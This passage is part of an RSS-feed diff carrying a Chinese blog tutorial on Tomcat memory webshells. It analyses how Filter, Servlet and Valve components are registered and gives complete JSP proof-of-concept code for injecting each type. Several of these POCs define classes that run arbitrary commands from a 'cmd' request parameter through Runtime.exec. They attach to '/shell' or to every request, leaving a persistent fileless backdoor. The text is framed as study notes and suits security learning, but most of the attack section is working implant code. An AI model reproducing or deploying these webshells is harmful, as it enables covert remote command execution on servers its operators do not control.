+通过filterChain.addFilter(filterConfig)将一个filterConfig添加到filterChain中
+</code></pre>
+<p>这是一套完整的调用逻辑了，但是我们应该怎么把恶意的Filter注入呢？</p>
+<p>我们看到刚刚分析的时候，是在最后的时候把filter取出来进行调用，在这之前都是封装在filterConfig中，所以我们一开始也是必须得把恶意的filter放入filterConfig中，所以我们就来看看它其中的格式（这里直接看佬的，不浪费时间找了）：</p>
+<h3 id="filter-2">Filter注册分析</h3>
+<h4 id="standardcontext">StandardContext</h4>
+<p>我们能看到此时的上下文对象<code>StandardContext</code>实际上是包含了这三者的：</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012831809_00034.png" alt="" /></p>
+<h4 id="font-stylecolorrgb50-50-93filterconfigsfont"><font style="color:rgb(50, 50, 93);">filterConfigs：</font></h4>
+<p>其中filterConfigs包含了当前的上下文信息<code>StandardContext</code>、以及<code>filterDef</code>等信息</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012835165_00037.png" alt="" /></p>
+<h4 id="filterdef">filterDef：</h4>
+<p>存放了filter的定义，包括filterClass、filterName等信息</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012837427_00038.png" alt="" /></p>
+<h4 id="font-stylecolorrgb50-50-93filterdefsfont"><font style="color:rgb(50, 50, 93);">filterDefs</font></h4>
+<p>是一个HashMap，以键值对的形式存储<code>filterDef</code></p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012732872_00003.png" alt="" /></p>
+<h4 id="font-stylecolorrgb50-50-93filtermapsfont"><font style="color:rgb(50, 50, 93);">filterMaps</font></h4>
+<p>以array的形式存放各filter的路径映射信息</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012754045_00014.png" alt="" /></p>
+<p>必要属性：<code>dispatcherMapping</code>、<code>filterName</code>、<code>urlPatterns</code></p>
+<h3 id="filter-3">注册Filter思路</h3>
+<ol>
+<li>获取StandardContext对象</li>
+<li>创建恶意Filter</li>
+<li>使用FilterDef对Filter进行封装，并添加必要的属性</li>
+<li>创建filterMap类，并将路径和Filtername绑定，然后将其添加到filterMaps中</li>
+<li>使用ApplicationFilterConfig封装filterDef，然后将其添加到filterConfigs中</li>
+</ol>
+<h4 id="standardcontext-1">获取StandardContext对象</h4>
+<p>StandardContext对象主要用来管理Web应用的一些全局资源，如Session、Cookie、Servlet等。因此我们有很多方法来获取StandardContext对象。</p>
+<p>Tomcat在启动时会为每个Context都创建个ServletContext对象，来表示一个Context，从而可以将ServletContext转化为StandardContext。</p>
+<pre><code class="language-java">//获取ApplicationContextFacade类
+ServletContext servletContext = request.getSession().getServletContext();
+ 
+//反射获取ApplicationContextFacade类属性context为ApplicationContext类
+Field appContextField = servletContext.getClass().getDeclaredField(&quot;context&quot;);
+appContextField.setAccessible(true);
+ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);
+ 
+//反射获取ApplicationContext类属性context为StandardContext类
+Field standardContextField = applicationContext.getClass().getDeclaredField(&quot;context&quot;);
+standardContextField.setAccessible(true);
+StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012755112_00015.png" alt="" /></p>
+<h4 id="filter-4">创建恶意Filter</h4>
+<pre><code class="language-java">public class CmdFilter implements Filter {
+    @Override
+    public void init(FilterConfig filterConfig) throws ServletException {
+        System.out.println(&quot;Filter 初始构造完成&quot;);
+    }
+
+    @Override
+    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
+        Runtime.getRuntime().exec(&quot;calc&quot;);
+        filterChain.doFilter(servletRequest,servletResponse);
+    }
+
+    @Override
+    public void destroy() {
+        System.out.println(&quot;filter 销毁&quot;);
+    }
+}
+</code></pre>
+<h4 id="filterdeffilter">FilterDef对Filter进行封装</h4>
+<pre><code class="language-java">String name=&quot;filterShell&quot;;
+FilterDef filterDef = new FilterDef();
+filterDef.setFilter(new CmdFilter());
+filterDef.setFilterClass(CmdFilter.class.getName());
+filterDef.setFilterName(name);
+context.addFilterDef(filterDef);
+</code></pre>
+<h4 id="filtermap">创建filterMap类</h4>
+<pre><code class="language-java">FilterMap filterMap = new FilterMap();
+	filterMap.setFilterName(name);
+	filterMap.setDispatcher(DispatcherType.REQUEST.name());
+	filterMap.addURLPattern(&quot;/*&quot;);
+	context.addFilterMap(filterMap);
+</code></pre>
+<h4 id="filterconfigs">注入到filterConfigs中</h4>
+<p>这里因为ApplicationFilterConfig的构造方法不是公共的，需要反射来进行调用</p>
+<pre><code class="language-java">Field Configs = context.getClass().getDeclaredField(&quot;filterConfigs&quot;);
+Configs.setAccessible(true);
+Map filterConfigs = (Map) Configs.get(context);
+Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
+constructor.setAccessible(true);
+ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(context,filterDef);
+filterConfigs.put(name, filterConfig);
+</code></pre>
+<h3 id="poc">POC</h3>
+<pre><code class="language-java">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
+&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;
+&lt;%@ page import=&quot;java.lang.reflect.Constructor&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationFilterConfig&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.Context&quot; %&gt;
+&lt;%@ page import=&quot;java.util.Map&quot; %&gt;
+&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
+&lt;%!
+    public class CmdFilter implements Filter {
+
+        @Override
+        public void init(FilterConfig filterConfig)  {
+            System.out.println(&quot;shell&quot;);
+        }
+
+        @Override
+        public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException, IOException {
+            Runtime.getRuntime().exec(&quot;calc&quot;);
+            chain.doFilter(request,response);
+        }
+
+        @Override
+        public void destroy() {
+        }
+    }
+%&gt;
+
+
+
+&lt;%
+    //获取ApplicationContextFacade类
+    ServletContext servletContext = request.getSession().getServletContext();
+
+//反射获取ApplicationContextFacade类属性context为ApplicationContext类
+    Field appContextField = servletContext.getClass().getDeclaredField(&quot;context&quot;);
+    appContextField.setAccessible(true);
+    ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);
+
+//反射获取ApplicationContext类属性context为StandardContext类
+    Field standardContextField = applicationContext.getClass().getDeclaredField(&quot;context&quot;);
+    standardContextField.setAccessible(true);
+    StandardContext context = (StandardContext) standardContextField.get(applicationContext);
+%&gt;
+
+&lt;%
+    String name=&quot;filtershell&quot;;
+    FilterDef filterDef = new FilterDef();
+    filterDef.setFilter(new CmdFilter());
+    filterDef.setFilterClass(CmdFilter.class.getName());
+    filterDef.setFilterName(name);
+    context.addFilterDef(filterDef);
+%&gt;
+
+&lt;%
+    FilterMap filterMap = new FilterMap();
+    filterMap.setFilterName(name);
+    filterMap.setDispatcher(DispatcherType.REQUEST.name());
+    filterMap.addURLPattern(&quot;/*&quot;);
+    context.addFilterMap(filterMap);
+%&gt;
+
+
+&lt;%
+    Field Configs = context.getClass().getDeclaredField(&quot;filterConfigs&quot;);
+    Configs.setAccessible(true);
+    Map filterConfigs = (Map) Configs.get(context);
+
+    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
+    constructor.setAccessible(true);
+    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(context,filterDef);
+    filterConfigs.put(name, filterConfig);
+%&gt;
+
+</code></pre>
+<p>还是一样 得先访问jsp木马文件，然后就会自动注入进去，注入完毕之后在我们访问资源之前就会进行拦截执行命令</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012756839_00016.png" alt="" /></p>
+<h2 id="servlet">Servlet型</h2>
+<p>其实思路都差不多，就是看怎么把恶意类注入到上下文中，每一种类型涉及的方法不一样，所以注入时调用的方法也不一样</p>
+<h3 id="servlet-1">编写恶意servlet</h3>
+<pre><code class="language-java">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
+&lt;%!
+    //jsp定义或者声明需要加上！
+    public class CmdServlet extends HttpServlet {
+        @Override
+        public void init(ServletConfig servletConfig){
+
+        }
+
+        @Override
+        public ServletConfig getServletConfig() {
+            return null;
+        }
+
+        @Override
+        public void service(ServletRequest servletRequest, ServletResponse servletResponse) {
+            String cmd = servletRequest.getParameter(&quot;cmd&quot;);
+            if(cmd!=null){
+                try {
+                    Runtime.getRuntime().exec(cmd);
+                } catch (IOException e) {
+                    throw new RuntimeException(e);
+                }
+            }
+
+        }
+
+        @Override
+        public String getServletInfo() {
+            return null;
+        }
+
+        @Override
+        public void destroy() {
+
+        }
+    }
+%&gt;
+</code></pre>
+<h3 id="servlet-2">注入servlet内存马</h3>
+<p>这里就只看ConfigContext#configureContext注册Servlet流程过程了，因为按照顺序来说是先listener-filter-servlet</p>
+<p>先写出大致步骤</p>
+<pre><code class="language-java">由上下文context创建wrapper，用来包装servlet
+设置Servlet名称
+设置Servlet全类名
+wrapoer设置servlet
+将wrapper放入context
+添加url路径映射
+</code></pre>
+<h4 id="standardwrapper">创建StandardWrapper</h4>
+<p>在<code>StandardContext</code>#<code>startInternal</code>中，调用了<code>fireLifecycleEvent()</code>方法解析web.xml文件</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012758770_00017.png" alt="" /></p>
+<p>看看fireLifecycleEvent()方法的具体实现：</p>
+<pre><code class="language-java">protected void fireLifecycleEvent(String type, Object data) {
+    LifecycleEvent event = new LifecycleEvent(this, type, data);
+    Iterator i$ = this.lifecycleListeners.iterator();
+
+    while(i$.hasNext()) {
+        LifecycleListener listener = (LifecycleListener)i$.next();
+        listener.lifecycleEvent(event);
+    }
+
+}
+</code></pre>
+<p>最终通过ContextConfig#webConfig()方法解析web.xml获取各种配置参数,里面通过调用configureContext方法来从context里面获取web.xml里面的信息</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012800812_00018.png" alt="" /></p>
+<p>获取到信息之后，是通过ContextConfig#addServletContainerInitializer来添加</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012802597_00019.png" alt="" /></p>
+<p>通过<code>configureContext(webXml)</code>方法创建StandWrapper对象，并根据解析参数初始化StandWrapper对象</p>
+<pre><code class="language-java"> private void configureContext(WebXml webxml) {
+        // As far as possible, process in alphabetical order so it is easy to
+        // check everything is present
+        // Some validation depends on correct public ID
+        context.setPublicId(webxml.getPublicId());
+ 
+...   //设置StandardContext参数
+ 
+        
+        for (ServletDef servlet : webxml.getServlets().values()) {
+ 
+            //创建StandardWrapper对象
+            Wrapper wrapper = context.createWrapper();
+ 
+            if (servlet.getLoadOnStartup() != null) {
+ 
+                //设置LoadOnStartup属性
+                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());
+            }
+            if (servlet.getEnabled() != null) {
+                wrapper.setEnabled(servlet.getEnabled().booleanValue());
+            }
+ 
+            //设置ServletName属性
+            wrapper.setName(servlet.getServletName());
+            Map&lt;String,String&gt; params = servlet.getParameterMap();
+            for (Entry&lt;String, String&gt; entry : params.entrySet()) {
+                wrapper.addInitParameter(entry.getKey(), entry.getValue());
+            }
+            wrapper.setRunAs(servlet.getRunAs());
+            Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();
+            for (SecurityRoleRef roleRef : roleRefs) {
+                wrapper.addSecurityReference(
+                        roleRef.getName(), roleRef.getLink());
+            }
+ 
+            //设置ServletClass属性
+            wrapper.setServletClass(servlet.getServletClass());
+            ...
+            wrapper.setOverridable(servlet.isOverridable());
+ 
+            //将包装好的StandWrapper添加进ContainerBase的children属性中
+            context.addChild(wrapper);
+ 
+           for (Entry&lt;String, String&gt; entry :
+                webxml.getServletMappings().entrySet()) {
+          
+            //添加路径映射
+            context.addServletMappingDecoded(entry.getKey(), entry.getValue());
+        }
+        }
+        ...
+    }
+</code></pre>
+<p>最后通过<code>addServletMappingDecoded()</code>方法添加Servlet对应的url映射</p>
+<h4 id="font-stylecolorrgb50-50-93standwrapperfont"><font style="color:rgb(50, 50, 93);">加载StandWrapper</font></h4>
+<p>在<code>StandardContext#startInternal</code>方法通过<code>findChildren()</code>获取<code>StandardWrapper</code>类</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012804967_00020.png" alt="" /></p>
+<p>最后依次加载完Listener、Filter后，就通过<code>loadOnStartUp()</code>方法加载wrapper</p>
+<pre><code class="language-java">    public boolean loadOnStartup(Container children[]) {
+ 
+        // Collect &quot;load on startup&quot; servlets that need to be initialized
+        TreeMap&lt;Integer, ArrayList&lt;Wrapper&gt;&gt; map = new TreeMap&lt;&gt;();
+        for (Container child : children) {
+            Wrapper wrapper = (Wrapper) child;
+            int loadOnStartup = wrapper.getLoadOnStartup();
+ 
+            //判断属性loadOnStartup的值
+            if (loadOnStartup &lt; 0) {
+                continue;
+            }
+            Integer key = Integer.valueOf(loadOnStartup);
+            ArrayList&lt;Wrapper&gt; list = map.get(key);
+            if (list == null) {
+                list = new ArrayList&lt;&gt;();
+                map.put(key, list);
+            }
+            list.add(wrapper);
+        }
+ 
+        // Load the collected &quot;load on startup&quot; servlets
+        for (ArrayList&lt;Wrapper&gt; list : map.values()) {
+            for (Wrapper wrapper : list) {
+                try {
+                    wrapper.load();
+                }
+</code></pre>
+<p>注意这里对于Wrapper对象中<code>loadOnStartup</code>属性的值进行判断，只有大于0的才会被放入list进行后续的<code>wrapper.load()</code>加载调用。</p>
+<p>这里对应的实际上就是Tomcat Servlet的懒加载机制，可以通过<code>loadOnStartup</code>属性值来设置每个Servlet的启动顺序。默认值为-1，所以是需要我们手动修改的</p>
+<p>总结一下需要完成哪些：</p>
+<pre><code class="language-java">获取StandardContext对象
+编写恶意Servlet
+通过StandardContext.createWrapper()创建StandardWrapper对象
+设置StandardWrapper对象的loadOnStartup属性值
+设置StandardWrapper对象的ServletName属性值
+设置StandardWrapper对象的ServletClass属性值
+将StandardWrapper对象添加进StandardContext对象的children属性中
+通过StandardContext.addServletMappingDecoded()添加对应的路径映射
+</code></pre>
+<p>获取StandardContext对象：</p>
+<pre><code class="language-java">&lt;%
+    Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);
+    reqF.setAccessible(true);
+    Request req = (Request) reqF.get(request);
+    StandardContext standardContext = (StandardContext) req.getContext();
+%&gt;
+</code></pre>
+<p>恶意类：</p>
+<pre><code class="language-java">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
+&lt;%!
+    //jsp定义或者声明需要加上！
+    public class CmdServlet extends HttpServlet {
+        @Override
+        public void init(ServletConfig servletConfig){
+
+        }
+
+        @Override
+        public ServletConfig getServletConfig() {
+            return null;
+        }
+
+        @Override
+        public void service(ServletRequest servletRequest, ServletResponse servletResponse) {
+            String cmd = servletRequest.getParameter(&quot;cmd&quot;);
+            if(cmd!=null){
+                try {
+                    Runtime.getRuntime().exec(cmd);
+                } catch (IOException e) {
+                    throw new RuntimeException(e);
+                }
+            }
+
+        }
+
+        @Override
+        public String getServletInfo() {
+            return null;
+        }
+
+        @Override
+        public void destroy() {
+
+        }
+    }
+%&gt;
+</code></pre>
+<p>创建StandardWrapper对象</p>
+<pre><code class="language-java">&lt;%
+    CmdServlet cmdServlet = new CmdServlet();
+    String name = cmdServlet.getClass().getSimpleName();
+ 
+    Wrapper wrapper = standardContext.createWrapper();
+    wrapper.setLoadOnStartup(1);
+    wrapper.setName(name);
+    wrapper.setServlet(cmdServlet);
+    wrapper.setServletClass(cmdServlet.getClass().getName());
+%&gt;
+</code></pre>
+<p>添加进上下文：</p>
+<pre><code class="language-java">&lt;%
+    standardContext.addChild(wrapper);
+    standardContext.addServletMappingDecoded(&quot;/shell&quot;,name);
+%&gt;
+</code></pre>
+<h3 id="poc-1">POC</h3>
+<pre><code class="language-java">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
+&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt;
+&lt;%!
+    //jsp定义或者声明需要加上！
+    public class CmdServlet extends HttpServlet {
+        @Override
+        public void init(ServletConfig servletConfig){
+
+        }
+
+        @Override
+        public ServletConfig getServletConfig() {
+            return null;
+        }
+
+        @Override
+        public void service(ServletRequest servletRequest, ServletResponse servletResponse) {
+            String cmd = servletRequest.getParameter(&quot;cmd&quot;);
+            if(cmd!=null){
+                try {
+                    Runtime.getRuntime().exec(cmd);
+                } catch (IOException e) {
+                    throw new RuntimeException(e);
+                }
+            }
+
+        }
+
+        @Override
+        public String getServletInfo() {
+            return null;
+        }
+
+        @Override
+        public void destroy() {
+
+        }
+    }
+%&gt;
+
+&lt;%
+    Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);
+    reqF.setAccessible(true);
+    Request req = (Request) reqF.get(request);
+    StandardContext standardContext = (StandardContext) req.getContext();
+%&gt;
+
+&lt;%
+    CmdServlet cmdServlet = new CmdServlet();
+    String name = cmdServlet.getClass().getSimpleName();
+
+    Wrapper wrapper = standardContext.createWrapper();
+    wrapper.setLoadOnStartup(1);
+    wrapper.setName(name);
+    wrapper.setServlet(cmdServlet);
+    wrapper.setServletClass(cmdServlet.getClass().getName());
+%&gt;
+
+&lt;%
+    standardContext.addChild(wrapper);
+    standardContext.addServletMappingDecoded(&quot;/shell&quot;,name);
+%&gt;
+
+</code></pre>
+<p>得先访问jsp文件 加载进去之后在对应的路径下执行命令</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012806818_00021.png" alt="" /></p>
+<h2 id="font-stylecolorrgb50-50-93valvefont"><font style="color:rgb(50, 50, 93);">Valve型</font></h2>
+<p>先学习一下什么是Valve</p>
+<p>我们先来简单了解一下Tomcat中的<code>管道机制</code></p>
+<p>我们知道，当Tomcat接收到客户端请求时，首先会使用<code>Connector</code>进行解析，然后发送到<code>Container</code>进行处理。那么我们的消息又是怎么在四类子容器中层层传递，最终送到Servlet进行处理的呢？这里涉及到的机制就是Tomcat管道机制。</p>
+<p>管道机制主要涉及到两个名词，Pipeline（管道）和Valve（阀门）。如果我们把请求比作管道（Pipeline）中流动的水，那么阀门（Valve）就可以用来在管道中实现各种功能，如控制流速等。因此通过管道机制，我们能按照需求，给在不同子容器中流通的请求添加各种不同的业务逻辑，并提前在不同子容器中完成相应的逻辑操作。这里的调用流程可以类比为Filter中的责任链机制</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012750852_00013.png" alt="" /></p>
+<p>在Tomcat中，四大组件Engine、Host、Context以及Wrapper都有其对应的Valve类，StandardEngineValve、StandardHostValve、StandardContextValve以及StandardWrapperValve，他们同时维护一个**<font style="color:#DF2A3F;">StandardPipeline</font>**实例。</p>
+<h3 id="font-stylecolorrgb50-50-93font"><font style="color:rgb(50, 50, 93);">管道机制流程分析</font></h3>
+<p>Pipeline接口：</p>
+<p>我们可以看到它是继承了Contained</p>
+<pre><code class="language-java">public interface Pipeline extends Contained {
+ 
+    public Valve getBasic();
+ 
+    public void setBasic(Valve valve);
+ 
+    public void addValve(Valve valve);
+ 
+    public Valve[] getValves();
+ 
+    public void removeValve(Valve valve);
+ 
+    public void findNonAsyncValves(Set&lt;String&gt; result);
+}
+</code></pre>
+<p>Pipeline接口提供了各种各样对Value操作的接口，例如我们等会需要用的的addValue</p>
+<p>Value接口：</p>
+<pre><code class="language-java">public interface Valve {
+ 
+    public Valve getNext();
+ 
+    public void setNext(Valve valve);
+ 
+    public void backgroundProcess();
+ 
+    public void invoke(Request request, Response response)
+        throws IOException, ServletException;
+ 
+    public boolean isAsyncSupported();
+}
+</code></pre>
+<p>其中getNext()方法可以用来获取下一个Valve，这个调用模式跟Filter的调用模式很像</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012809934_00023.jpeg" alt="" /></p>
+<p>通过源码看一看，消息在容器之间是如何传递的</p>
+<p>消息传递到Connector被解析后，在<code>org.apache.catalina.connector.CoyoteAdapter#service</code>方法中：</p>
+<pre><code class="language-java">public void service(org.apache.coyote.Request req, org.apache.coyote.Response res) throws Exception {
+    Request request = (Request) req.getNote(ADAPTER_NOTES);
+    Response response = (Response) res.getNote(ADAPTER_NOTES);
+
+    if (request == null) {
+        // Create objects
+        request = connector.createRequest();
+        request.setCoyoteRequest(req);
+        response = connector.createResponse();
+        response.setCoyoteResponse(res);
+
+        // Link objects
+        request.setResponse(response);
+        response.setRequest(request);
+
+        // Set as notes
+        req.setNote(ADAPTER_NOTES, request);
+        res.setNote(ADAPTER_NOTES, response);
+
+        // Set query string encoding
+        req.getParameters().setQueryStringCharset(connector.getURICharset());
+    }
+        ...
+
+    try {
+        ...
+        connector.getService().getContainer().getPipeline().getFirst().invoke(   request, response);
+    }
+        ...
+}
+</code></pre>
+<p>主要的就是看这个**<font style="color:#DF2A3F;">connector.getService().getContainer().getPipeline().getFirst().invoke(request, response);</font>**</p>
+<p>我们这里最好是通过断点来看，看的更清楚</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012811794_00024.png" alt="" /></p>
+<p>connector.getService()： 获得StandardService<br />
+<img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012813172_00025.png" alt="" /></p>
+<p>接着通过StandardService.getContainer().getPipeline()获取StandardPipeline对象</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012808404_00022.png" alt="" /></p>
+<p>connector.getService().getContainer().getPipeline().getFirst() 获取到Valve</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012819331_00027.png" alt="" /></p>
+<p>然后就是通过invoke方法 来执行不同的方法了</p>
+<h3 id="valve">注入Valve</h3>
+<p>我们可以看到是通过getFirst()来获取到不同的Valve 然后在执行对应的操作，那么我们就只需要获取到网页的context，然后把我们恶意的Value存放进去，就可以达到攻击目的了</p>
+<p>我们看看在哪里存放了Valve ，找到Pipeline</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012817077_00026.png" alt="" /></p>
+<p>pipeline是在它的父类中定义的</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012828305_00032.png" alt="" /></p>
+<p>接着看</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012834048_00036.png" alt="" /></p>
+<p>可以通过addValve方法添加Valve</p>
+<p>那么现在思路就明确了：</p>
+<ol>
+<li>获取<code>StandardContext</code>对象</li>
+<li>通过<code>StandardContext</code>对象获取<code>StandardPipeline</code></li>
+<li>编写恶意Valve</li>
+<li>通过<code>StandardPipeline.addValve()</code>动态添加Valve</li>
+</ol>
+<p>获取StandardPipeline对象</p>
+<pre><code class="language-java">&lt;%
+Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);
+reqF.setAccessible(true);
+Request req = (Request) reqF.get(request);
+StandardContext standardContext = (StandardContext) req.getContext();
+
+Pipeline pipeline = standardContext.getPipeline();
+%&gt;
+</code></pre>
+<p>编写恶意Valve</p>
+<p>继承父类，并且重写invoke方法</p>
+<pre><code class="language-java">&lt;%!
+class Shell_Valve extends ValveBase {
+
+@Override
+public void invoke(Request request, Response response) throws IOException, ServletException {
+    String cmd = request.getParameter(&quot;cmd&quot;);
+    if (cmd !=null){
+        try{
+            Runtime.getRuntime().exec(cmd);
+        }catch (IOException e){
+            e.printStackTrace();
+        }catch (NullPointerException n){
+            n.printStackTrace();
+        }
+    }
+}
+}
+%&gt;
+</code></pre>
+<p>动态添加Valve</p>
+<pre><code class="language-java">&lt;%
+Shell_Valve shell_valve = new Shell_Valve();
+pipeline.addValve(shell_valve);
+%&gt;
+</code></pre>
+<h3 id="poc-2">POC</h3>
+<pre><code class="language-java">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.Pipeline&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.valves.ValveBase&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.connector.Response&quot; %&gt;
+&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
+&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
+
+&lt;%
+Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);
+reqF.setAccessible(true);
+Request req = (Request) reqF.get(request);
+StandardContext standardContext = (StandardContext) req.getContext();
+
+Pipeline pipeline = standardContext.getPipeline();
+%&gt;
+
+&lt;%!
+class Shell_Valve extends ValveBase {
+
+    @Override
+    public void invoke(Request request, Response response) throws IOException, ServletException {
+        String cmd = request.getParameter(&quot;cmd&quot;);
+        if (cmd !=null){
+            try{
+                Runtime.getRuntime().exec(cmd);
+            }catch (IOException e){
+                e.printStackTrace();
+            }catch (NullPointerException n){
+                n.printStackTrace();
+            }
+        }
+    }
+}
+%&gt;
+
+&lt;%
+Shell_Valve shell_valve = new Shell_Valve();
+pipeline.addValve(shell_valve);
+%&gt;
+</code></pre>
+<p>访问jsp文件后 动态注入内存马 任意路径可以执行命令</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012732851_00002.png" alt="" /></p>
+<h1 id="heading">总结</h1>
+<p>其实Tomcat内存马学起来也不算太难，别给自己设置难度（这里是因为作者的开发功底不太好，很多基础的东西并没有去学过，所以一直在拖延吧，得好好反思），java的学习是需要沉下心来学习的 加油</p>
+]]></description>
+    </item>
+  </channel>
+</rss>
